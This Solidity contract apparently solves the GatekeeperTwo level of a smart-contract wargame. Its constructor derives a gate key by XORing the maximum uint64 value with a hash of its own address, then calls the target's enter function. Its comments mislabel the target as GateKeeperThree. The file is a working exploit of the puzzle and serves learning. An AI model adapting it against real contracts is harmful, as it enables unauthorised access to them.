// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title AttackGateKeeperTwo
/// @author IbCaOs
contract AttackGateKeeperTwo {
    // Public variable to store the address of the GateKeeper contract
    address public gateKeeper;

    /// @dev Constructor to initiate an attack attempt when this contract is deployed
    /// @param _target The address of the GateKeeper contract to be attacked
    constructor(address _target) {
        // Set the GateKeeper address
        gateKeeper = _target;

        // In the GateKeeperThree contract, there's a require statement which checks
        // if the XOR operation of the hashed sender address and _gateKey equals type(uint64).max.
        // By using maxUint64 (which is type(uint64).max) and the hashed address of this contract,
        // we are essentially calculating the "inverse" for the XOR operation.
        // This helps us generate a valid _gateKey that satisfies the require statement in GateKeeperThree.

        // Define the maximum value for a uint64 type.
        uint64 maxUint64 = 0xFFFFFFFFFFFFFFFF;

        // Hash the contract's address and convert it into a uint64 type.
        uint64 sender = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );

        // Compute the XOR between maxUint64 and sender to generate the 'gateKey'.
        bytes8 gateKey = bytes8(maxUint64 ^ sender);

        // Call the 'enter' function of the GateKeeper contract with the generated 'gateKey'
        (bool success, ) = _target.call(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );

        // Ensure the transaction was successful, if not, revert with an error message
        require(success, "ERROR: TX FAILED");
    }
}
